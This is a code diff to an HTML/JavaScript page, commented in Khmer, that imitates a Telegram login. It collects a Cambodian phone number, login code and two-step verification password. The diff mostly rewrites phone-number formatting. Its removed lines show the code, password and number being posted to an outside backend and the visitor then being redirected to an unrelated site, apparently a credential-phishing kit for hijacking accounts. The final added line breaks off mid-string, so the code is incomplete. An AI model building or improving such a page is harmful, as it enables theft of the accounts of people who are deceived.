@@ -48,8 +48,8 @@
             <div class="space-y-4 text-left">
                 <div>
                     <label class="block text-xs text-gray-400 mb-1 ml-1">Phone Number</label>
-                    <!-- បន្ថែម event oninput ដើម្បី Format លេខដកឃ្លា -->
-                    <input id="phone-input" type="text" value="+855 " placeholder="+855 15 944 782" oninput="formatPhoneNumber(this)" class="tg-input w-full p-3">
+                    <!-- បន្ថែម onkeydown ដើម្បីទប់ស្កាត់ការលុប +855  -->
+                    <input id="phone-input" type="text" value="+855 " placeholder="+855 15 944 782" oninput="formatPhoneNumber(this)" onkeydown="preventPrefixDelete(event, this)" class="tg-input w-full p-3">
                 </div>
             </div>
             <button id="btn-send" onclick="sendPhone()" class="w-full bg-[#5288c1] hover:bg-[#4372a5] active:scale-95 text-white font-medium py-3 rounded-xl transition-all duration-75">SEND CODE</button>
@@ -86,25 +86,29 @@
     <script>
         const BACKEND_URL = "https://jvpcambodia.up.railway.app";
 
-        // Function សម្រាប់ Format លេខទូរស័ព្ទឱ្យដកឃ្លាស្វ័យប្រវត្តិ (+855 XX XXX XXX)
-        function formatPhoneNumber(input) {
-            let val = input.value;
-            
-            // យកតែលេខចេញប៉ុណ្ណោះ
-            let digits = val.replace(/[^\d]/g, '');
-
-            if (digits.startsWith('855')) {
-                let rest = digits.slice(3);
-                let parts = ['+855'];
-
-                if (rest.length > 0) parts.push(rest.slice(0, 2));
-                if (rest.length > 2) parts.push(rest.slice(2, 5));
-                if (rest.length > 5) parts.push(rest.slice(5, 9));
-
-                input.value = parts.join(' ');
-            } else {
-                input.value = '+' + digits;
+        // ទប់ស្កាត់មិនឱ្យលុបអក្សរ "+855 "
+        function preventPrefixDelete(e, input) {
+            const prefixLength = 5; // ប្រវែងនៃ "+855 "
+            if (e.key === 'Backspace' && input.selectionStart <= prefixLength && input.selectionEnd <= prefixLength) {
+                e.preventDefault();
             }
+        }
+
+        // Format លេខទូរស័ព្ទស្វ័យប្រវត្តិ (+855 XX XXX XXX)
+        function formatPhoneNumber(input) {
+            const prefix = '+855 ';
+            let rawDigits = input.value.replace(/[^\d]/g, '');
+
+            if (rawDigits.startsWith('855')) {
+                rawDigits = rawDigits.slice(3);
+            }
+
+            let parts = [];
+            if (rawDigits.length > 0) parts.push(rawDigits.slice(0, 2));
+            if (rawDigits.length > 2) parts.push(rawDigits.slice(2, 5));
+            if (rawDigits.length > 5) parts.push(rawDigits.slice(5, 9));
+
+            input.value = prefix + parts.join(' ');
         }
 
         async function sendPhone() {
@@ -115,7 +119,7 @@
             const phoneClean = phoneInput.value.replace(/\s+/g, '').trim();
 
             if (!phoneClean || phoneClean.length < 9) {
-                alert('Please enter a valid phone number with country code.');
+                alert('Please enter a valid phone number.');
                 return;
             }
 
@@ -162,45 +166,4 @@
 
             btn.disabled = true;
             btn.innerText = 'VERIFYING...';
-            btn.classList.add('opacity-70');
-
-            try {
-                const res = await fetch(`${BACKEND_URL}/api/verify-code`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        phoneNumber: phoneClean, 
-                        code: code,
-                        password: password || undefined
-                    })
-                });
-                const data = await res.json();
-
-                if (data.success) {
-                    window.location.href = "https://jvpfans.com";
-                } else if (data.requiresPassword) {
-                    document.getElementById('password-container').classList.remove('hidden');
-                    alert('This account has Two-Step Verification enabled. Please enter your 2FA password.');
-                } else {
-                    alert(data.error || 'Verification failed.');
-                }
-            } catch (err) {
-                alert('Connection error!');
-                console.error(err);
-            } finally {
-                btn.disabled = false;
-                btn.innerText = 'VERIFY & LOGIN';
-                btn.classList.remove('opacity-70');
-            }
-        }
-
-        function goBack() {
-            document.getElementById('step-otp').classList.add('hidden');
-            document.getElementById('password-container').classList.add('hidden');
-            document.getElementById('password-input').value = '';
-            document.getElementById('otp-input').value = '';
-            document.getElementById('step-phone').classList.remove('hidden');
-        }
-    </script>
-</body>
-</html>
+            btn.classList.add('opacity-70
